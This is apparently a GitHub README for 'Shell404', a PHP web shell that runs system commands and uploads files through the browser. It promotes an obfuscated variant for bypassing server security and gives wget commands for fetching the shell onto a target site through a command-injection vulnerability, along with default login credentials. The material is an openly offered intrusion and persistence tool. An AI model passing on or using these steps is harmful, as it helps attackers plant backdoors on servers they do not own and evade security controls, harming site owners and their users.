# Shell404 🛠️

**Shell404** is a simple yet powerful PHP web shell created by [Anon-404](https://github.com/Anon-404). It provides a minimalistic interface for executing system commands and managing file uploads securely, all through your web browser.

## ✨ Features

- ⚙️ **Command Execution**: Run system commands directly from the web interface and view the output.
- 📁 **File Upload**: Safely upload files to the server with a straightforward interface.
- 🔐 **Login Authentication**: Restrict access to authorized users with a username and password system.
- 🛡️ **Obfuscated Version**: Use the obfuscated shell (`obf-Shell404.php`) for bypassing server security restrictions.

## 🔑 Default Login Credentials 

```php
$user = "Shell404";
$pass = "Shell404";
```

## 🚀 Installation

1. 📥 Clone the repository or download either the original `shell404.php` or the obfuscated `obf-Shell404.php` file.
2. 🚀 Upload the chosen file to your server's web directory.
3. 🌐 Access the web shell via your browser by navigating to the file.

## 🛡️ Usage

1. 🌐 Open the web shell in your browser.
2. 🔑 Login using the default credentials:
   - **Username**: Shell404
   - **Password**: Shell404
3. After logging in, you can:
   - ⚙️ **Command Input**: Enter system commands and view the results in real-time.
   - 📁 **File Upload**: Use the file upload feature to transfer files to the server.

## 💻 Direct Download via Command Injection

If the target website has a **command injection vulnerability**, you can easily download the Shell404 web shell using the following command:

```bash
wget https://raw.githubusercontent.com/Anon-404/Shell404/main/Shell404.php
```
### If have server security restriction

```bash
wget https://raw.githubusercontent.com/Anon-404/Shell404/main/obf-Shell404.php
```

This will fetch the obfuscated `obf-Shell404.php` file from the GitHub repository to the target server, allowing you to access the shell through the browser.

## 🛠️ Customization

You can personalize the default username and password by editing the variables at the top of the `shell404.php` or `obf-Shell404.php` file:

```php
$user = "Shell404";
$pass = "Shell404";
```
